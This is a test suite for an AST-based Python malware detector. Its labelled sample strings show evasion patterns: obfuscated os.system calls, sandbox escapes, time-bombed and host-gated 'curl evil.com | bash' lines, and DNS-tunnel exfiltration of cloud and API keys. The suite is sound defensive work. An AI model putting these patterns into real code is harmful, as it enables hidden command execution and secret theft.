"""Adversarial robustness test suite for the AST detector.

Goal: validate that `asg.ast_rules.scan_python_ast` catches evasion patterns
that pure-regex detection fundamentally cannot. Each sample is labeled with:

  tier  — A: identifier reconstruction (string-eval)
          B: indirection chain
          C: dormant / conditional payload
          D: side-channel exfil (no obvious HTTP POST)
          E: serialization / bytecode / native (AST has visible markers)
          F: install-time / build-time triggers
          N: negative (legitimate code; must NOT misfire)
          K: known-blind (AST CANNOT catch — documented limitation)

The K-tier samples are the honest part: we run them and assert AST does NOT
catch them, so anyone reading the test output knows what defense layers are
still needed (taint analysis, cross-file flow, runtime sandboxing).

Run:
    python -m pytest tests/test_ast_adversarial.py -v
or:
    python tests/test_ast_adversarial.py    (standalone runner)
"""
from __future__ import annotations

import sys
from dataclasses import dataclass
from pathlib import Path

# Allow `python tests/test_ast_adversarial.py` standalone execution.
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from asg.ast_rules import scan_python_ast  # noqa: E402


@dataclass
class Sample:
    sid: str
    tier: str
    description: str
    source: str
    must_hit: set[str]          # rule_ids that AST must produce
    must_not_hit: set[str]      # rule_ids that AST must NOT produce (e.g. on N samples)
    note: str = ""              # human commentary; explains why AST can/can't catch


SAMPLES: list[Sample] = [
    # =====================================================================
    # Tier A — identifier reconstruction via string-eval
    # AST must fold the constant-string expressions to the real module name.
    # =====================================================================
    Sample(
        sid="A1_reverse_slice",
        tier="A",
        description="字符串反转重建标识符: 'metsys'[::-1] → 'system'",
        source=(
            "getattr(__import__('os'), 'metsys'[::-1])('rm -rf /tmp/x')\n"
        ),
        must_hit={"SC1"},
        must_not_hit=set(),
        note="resolve_call_target → getattr(<__import__('os')>, 'system') → os.system",
    ),
    Sample(
        sid="A2_hex_decode",
        tier="A",
        description="bytes.fromhex 重建模块名: 6f73 → 'os'",
        source=(
            "import os\n"
            "mod = __import__(bytes.fromhex('6f73').decode())\n"
            "mod.system('id')\n"
        ),
        must_hit={"SC2"},  # __import__ 本身是 SC2; mod.system 此处因为 mod 是变量赋值，要看 const 传播
        must_not_hit=set(),
        note="const_str 应能 fold bytes.fromhex('6f73').decode() → 'os'",
    ),
    Sample(
        sid="A3_constant_prop",
        tier="A",
        description="单步常量传播: m='os'; __import__(m).system(...)",
        source=(
            "m = 'os'\n"
            "__import__(m).system('whoami')\n"
        ),
        must_hit={"SC1", "SC2"},
        must_not_hit=set(),
        note="resolve_module_ref(__import__(m)) → m 是 const_vars 里的 'os' → 'os' → os.system",
    ),
    Sample(
        sid="A4_b64_module_name",
        tier="A",
        description="base64 解码模块名: b64decode('b3M=') → 'os'",
        source=(
            "import base64\n"
            "mod = __import__(base64.b64decode('b3M=').decode())\n"
            "mod.system('id')\n"
        ),
        must_hit={"SC1", "SC2"},
        must_not_hit=set(),
        note="_const_from_call → base64.b64decode + .decode() 模式 fold",
    ),
    Sample(
        sid="A5_bytes_int_list",
        tier="A",
        description="bytes([111,115]).decode() → 'os'",
        source=(
            "mod = __import__(bytes([111, 115]).decode())\n"
            "mod.system('id')\n"
        ),
        must_hit={"SC2"},  # __import__ 本身
        must_not_hit=set(),
        note="_const_from_call → bytes(literal_int_list) 处理",
    ),

    # =====================================================================
    # Tier B — indirection chains. AST sees the structural markers
    # (getattr/globals/__class__.__mro__/_getframe) even when the operand
    # strings are obfuscated.
    # =====================================================================
    Sample(
        sid="B1_subclasses_jailbreak",
        tier="B",
        description="经典通用越狱: ().__class__.__mro__[-1].__subclasses__()",
        source=(
            "for cls in ().__class__.__mro__[-1].__subclasses__():\n"
            "    if cls.__name__ == 'Popen':\n"
            "        cls(['id'])\n"
        ),
        must_hit={"SC2"},
        must_not_hit=set(),
        note="visit_Call → node.func.attr == '__subclasses__' → CRITICAL",
    ),
    Sample(
        sid="B2_globals_builtins",
        tier="B",
        description="globals()['__builtins__'] 间接拿 eval",
        source=(
            "globals()['__builtins__'].eval(\"__import__('os').system('id')\")\n"
        ),
        must_hit={"SC2"},
        must_not_hit=set(),
        note="visit_Subscript: globals()['__builtins__'] → HIGH",
    ),
    Sample(
        sid="B3_triple_getattr",
        tier="B",
        description="三层 getattr 拼接 __import__",
        source=(
            "getattr(getattr(__builtins__, '__im' + 'port__'), '__call__')('os')"
            ".system('id')\n"
        ),
        must_hit={"SC1"},  # 最外层 .system('id') 应该解出来
        must_not_hit=set(),
        note=("挑战性最大：嵌套 getattr + 字符串拼接。"
              "resolve_module_ref 需要递归解析 getattr 的返回作为 module-ref。"),
    ),
    Sample(
        sid="B4_frame_escape",
        tier="B",
        description="sys._getframe → f_globals['__builtins__'] → __import__",
        source=(
            "import sys\n"
            "sys._getframe(0).f_globals['__builtins__'].__import__('os')"
            ".system('id')\n"
        ),
        must_hit={"SC2"},  # sys._getframe 是 frame-escape sink
        must_not_hit=set(),
        note="FRAME_ESCAPE_SINKS 命中 sys._getframe；下游 .system 解析较难",
    ),

    # =====================================================================
    # Tier C — dormancy / conditional / decorator-time
    # =====================================================================
    Sample(
        sid="C1_time_bomb",
        tier="C",
        description="if time.time() > N: 危险调用（时间炸弹）",
        source=(
            "import time, subprocess\n"
            "if time.time() > 1820000000:  # 2027-09-30 之后\n"
            "    subprocess.run(['curl', 'http://evil.com/x.sh'])\n"
        ),
        must_hit={"SC1", "SC2"},  # SC1: subprocess.run, SC2: dormancy guard
        must_not_hit=set(),
        note="visit_If → time.time() 比较门 + body 含危险调用 → SC2 evasion",
    ),
    Sample(
        sid="C2_hostname_fence",
        tier="C",
        description="if socket.gethostname() == ...: 主机指纹门",
        source=(
            "import socket, os\n"
            "if socket.gethostname() == 'target-corp-laptop':\n"
            "    os.system('curl evil.com | bash')\n"
        ),
        must_hit={"SC1", "SC2"},
        must_not_hit=set(),
        note="visit_If → socket.gethostname() 指纹门 + body 含 os.system",
    ),
    Sample(
        sid="C3_except_hidden_exec",
        tier="C",
        description="故意触发异常，恶意调用藏在 except",
        source=(
            "try:\n"
            "    open('/dev/this-cannot-exist', 'x')\n"
            "except Exception:\n"
            "    __import__('os').system('curl evil.com|bash')\n"
        ),
        must_hit={"SC1", "SC2"},
        must_not_hit=set(),
        note="visit_Try → handler body 含 __import__ / os.system",
    ),
    Sample(
        sid="C4_decorator_trigger",
        tier="C",
        description="装饰器在类定义时即执行（import 触发）",
        source=(
            "import os\n"
            "def _evil_dec(cls):\n"
            "    os.system('curl evil.com')\n"
            "    return cls\n"
            "@_evil_dec\n"
            "class Inert:\n"
            "    pass\n"
        ),
        must_hit={"SC1", "SC2"},
        must_not_hit=set(),
        note="visit_ClassDef → 扫装饰器名 → 查 function_table 找到 _evil_dec 体含 os.system",
    ),

    # =====================================================================
    # Tier D — side-channel exfil. No requests.post, no socket.send.
    # =====================================================================
    Sample(
        sid="D1_dns_exfil",
        tier="D",
        description="DNS 隧道: gethostbyname(b32(secret) + '.attacker.com')",
        source=(
            "import os, socket, base64\n"
            "secret = os.environ['AWS_SECRET_ACCESS_KEY']\n"
            "host = base64.b32encode(secret.encode()).decode().lower() "
            "+ '.evil.example.com'\n"
            "socket.gethostbyname(host)\n"
        ),
        must_hit={"E1", "E2"},
        must_not_hit=set(),
        note=("E2: os.environ['AWS_SECRET_...']; "
              "E1: socket.gethostbyname 本身是 NETWORK_EXFIL_SINKS"),
    ),
    Sample(
        sid="D2_dns_exfil_inline",
        tier="D",
        description="DNS 隧道（内联），AST 启发式必须识别 'encoded + domain' 模式",
        source=(
            "import os, socket, base64\n"
            "socket.gethostbyname(\n"
            "    base64.b32encode(os.environ['ANTHROPIC_API_KEY'].encode())"
            ".decode().lower() + '.dns.evil.com'\n"
            ")\n"
        ),
        must_hit={"E1", "E2"},
        must_not_hit=set(),
        note="_arg_looks_like_dns_tunnel 启发式触发 → E1 升 HIGH",
    ),

    # =====================================================================
    # Tier E — serialization / bytecode / native (AST sees the sink)
    # =====================================================================
    Sample(
        sid="E1_marshal_exec_taint",
        tier="E",
        description="marshal.loads → exec 污点链",
        source=(
            "import marshal\n"
            "co = marshal.loads(b'\\xe3\\x00')\n"
            "exec(co)\n"
        ),
        must_hit={"SC2", "SC3"},
        must_not_hit=set(),
        note=("visit_Assign 把 co 标 tainted='marshal code object'; "
              "visit_Call 抓 exec(co) 时检测 args[0].id in tainted → SC3 CRITICAL"),
    ),
    Sample(
        sid="E2_pickle_loads",
        tier="E",
        description="pickle.loads 反序列化外部文件（REDUCE 任意调用）",
        source=(
            "import pickle\n"
            "pickle.loads(open('/tmp/cache.pkl', 'rb').read())\n"
        ),
        must_hit={"SC3"},
        must_not_hit=set(),
        note="SERIALIZATION_SINKS['pickle.loads'] = HIGH",
    ),
    Sample(
        sid="E3_ctypes_native",
        tier="E",
        description="加载本地 .so（二进制内容 AST 完全无法审计）",
        source=(
            "import ctypes\n"
            "lib = ctypes.CDLL('./libplugin.so')\n"
            "lib.exfiltrate()\n"
        ),
        must_hit={"SC3"},
        must_not_hit=set(),
        note="NATIVE_LIB_SINKS 命中；上层应当人工审 .so",
    ),
    Sample(
        sid="E4_yaml_load_unsafe",
        tier="E",
        description="yaml.load 不带 Loader = 任意 Python 对象反序列化",
        source=(
            "import yaml\n"
            "cfg = yaml.load(open('config.yml'))\n"
        ),
        must_hit={"SC3"},
        must_not_hit=set(),
        note=("SERIALIZATION_SINKS['yaml.load']=MEDIUM. "
              "理想情况应再判 SafeLoader/CSafeLoader 参数；当前是粗粒度。"),
    ),
    Sample(
        sid="E5_exec_compile_stage2",
        tier="E",
        description="exec(compile(open(...).read(),...)) — 二阶 payload loader",
        source=(
            "exec(compile(open('/tmp/.cache/stage2.py').read(), '<x>', 'exec'))\n"
        ),
        must_hit={"SC2", "SC3"},
        must_not_hit=set(),
        note="visit_Call 抓 exec(compile(...)) 模式 → SC3 HIGH",
    ),

    # =====================================================================
    # Tier N — negative cases. AST must NOT misfire.
    # =====================================================================
    Sample(
        sid="N1_legit_path_lookup",
        tier="N",
        description="读 PATH 做工具发现 — 合法",
        source=(
            "import os\n"
            "for d in os.environ.get('PATH', '/usr/bin').split(os.pathsep):\n"
            "    print(d)\n"
        ),
        must_hit=set(),
        must_not_hit={"E2"},
        note="PATH 在 SAFE_ENV_WHITELIST",
    ),
    Sample(
        sid="N2_legit_home_subscript",
        tier="N",
        description="读 HOME 做 config 路径拼装 — 合法",
        source=(
            "import os\n"
            "from pathlib import Path\n"
            "cfg = Path(os.environ['HOME']) / '.config' / 'app.yml'\n"
        ),
        must_hit=set(),
        must_not_hit={"E2"},
        note="HOME 在 SAFE_ENV_WHITELIST",
    ),
    Sample(
        sid="N3_legit_subprocess_git",
        tier="N",
        description="subprocess 调 git 是日常操作，仅是 capability，不应升级",
        source=(
            "import subprocess\n"
            "log = subprocess.run(['git', 'log', '--oneline'],\n"
            "                     capture_output=True, text=True).stdout\n"
        ),
        must_hit={"SC1"},        # 仍然触发 SC1 (capability)
        must_not_hit={"SC3"},    # 但不应连带触发 SC3 evasion
        note="SC1 是真实的 capability。要 git 用 subprocess 是正常的；"
             "上层 risk_scorer 应根据命令实际内容判断不升 CRITICAL。",
    ),
    Sample(
        sid="N4_legit_json_loads",
        tier="N",
        description="json.loads 不是反序列化攻击面",
        source=(
            "import json\n"
            "data = json.loads(open('config.json').read())\n"
        ),
        must_hit=set(),
        must_not_hit={"SC3"},
        note="json.loads 不在 SERIALIZATION_SINKS",
    ),

    # =====================================================================
    # Tier K — known blind spots. We assert AST does NOT catch them, so
    # the limitations are visible in test output rather than hidden.
    # These need additional defense layers (taint, cross-file, runtime).
    # =====================================================================
    Sample(
        sid="K1_runtime_string_build",
        tier="K",
        description="字符串完全在运行时拼装（input/file/env）",
        source=(
            "import os\n"
            "cmd_module = os.environ.get('PLUGIN_MOD', 'os')\n"
            "__import__(cmd_module).system('id')\n"
        ),
        must_hit={"SC2"},          # __import__ 本身仍会被抓
        must_not_hit={"SC1"},      # 但 os.system 解析不出来（cmd_module 来源是 env）
        note=("AST 盲区：cmd_module 不是 const_vars，只能识别 __import__ 是危险调用。"
              "要真正抓需要 inter-procedural taint。"),
    ),
    Sample(
        sid="K2_cross_file_payload",
        tier="K",
        description="payload 在另一个文件，单文件 AST 看不到",
        source=(
            "from . import helpers\n"
            "helpers.do_the_thing()\n"
        ),
        must_hit=set(),
        must_not_hit={"SC1", "SC2", "SC3"},
        note="跨文件流分析才能发现。需要全包级 AST + import graph。",
    ),
    Sample(
        sid="K3_dynamic_attribute_string_runtime",
        tier="K",
        description="getattr 的 attr 字符串完全运行时来源",
        source=(
            "import os, json\n"
            "spec = json.loads(open('/tmp/spec.json').read())\n"
            "getattr(os, spec['method'])(spec['arg'])\n"
        ),
        must_hit=set(),
        must_not_hit={"SC1"},
        note="getattr 的第二参数不是 const → resolve_call_target 失败。盲区。",
    ),
]


# ---------------------------------------------------------------------------
# Pytest entry
# ---------------------------------------------------------------------------

def _ids() -> list[str]:
    return [f"{s.tier}-{s.sid}" for s in SAMPLES]


try:
    import pytest

    @pytest.mark.parametrize("sample", SAMPLES, ids=_ids())
    def test_ast_adversarial(sample: Sample) -> None:
        findings = scan_python_ast(Path(f"<test>/{sample.sid}.py"), sample.source)
        actual = {f.rule_id for f in findings}
        missing = sample.must_hit - actual
        wrongly_hit = sample.must_not_hit & actual
        assert not missing and not wrongly_hit, (
            f"\n[{sample.tier}/{sample.sid}] {sample.description}\n"
            f"  must_hit     = {sorted(sample.must_hit)}\n"
            f"  must_not_hit = {sorted(sample.must_not_hit)}\n"
            f"  actual       = {sorted(actual)}\n"
            f"  missing      = {sorted(missing)}  ← AST 应该抓但没抓到\n"
            f"  wrongly_hit  = {sorted(wrongly_hit)}  ← 误报\n"
            f"  note: {sample.note}\n"
            f"  source:\n    {sample.source.strip().splitlines()}"
        )
except ImportError:
    pytest = None  # type: ignore[assignment]


# ---------------------------------------------------------------------------
# Standalone runner: python tests/test_ast_adversarial.py
# Prints a colored summary table; exits non-zero if any required hits missing.
# ---------------------------------------------------------------------------

def main() -> int:
    passed = 0
    failed = 0
    rows: list[tuple[str, str, str, str, str]] = []
    for s in SAMPLES:
        findings = scan_python_ast(Path(f"<test>/{s.sid}.py"), s.source)
        actual = {f.rule_id for f in findings}
        missing = s.must_hit - actual
        wrong = s.must_not_hit & actual
        ok = not missing and not wrong
        status = "PASS" if ok else "FAIL"
        if ok:
            passed += 1
        else:
            failed += 1
        rows.append((
            s.tier,
            s.sid,
            status,
            ",".join(sorted(actual)) or "-",
            (f"missing={sorted(missing)}" if missing else "")
            + (f" wrong={sorted(wrong)}" if wrong else ""),
        ))

    w_tier, w_sid, w_status = 4, 36, 6
    print(f"\n{'tier':<{w_tier}} {'sid':<{w_sid}} {'stat':<{w_status}} "
          f"{'rules_hit':<24} note")
    print("-" * 100)
    for tier, sid, status, hits, note in rows:
        print(f"{tier:<{w_tier}} {sid:<{w_sid}} {status:<{w_status}} "
              f"{hits:<24} {note}")
    print("-" * 100)
    total = passed + failed
    print(f"summary: {passed}/{total} passed  ({failed} failed)")
    # Group summary by tier
    by_tier: dict[str, list[bool]] = {}
    for s, row in zip(SAMPLES, rows):
        by_tier.setdefault(s.tier, []).append(row[2] == "PASS")
    print("by tier: " + "  ".join(
        f"{t}={sum(v)}/{len(v)}" for t, v in sorted(by_tier.items())
    ))
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
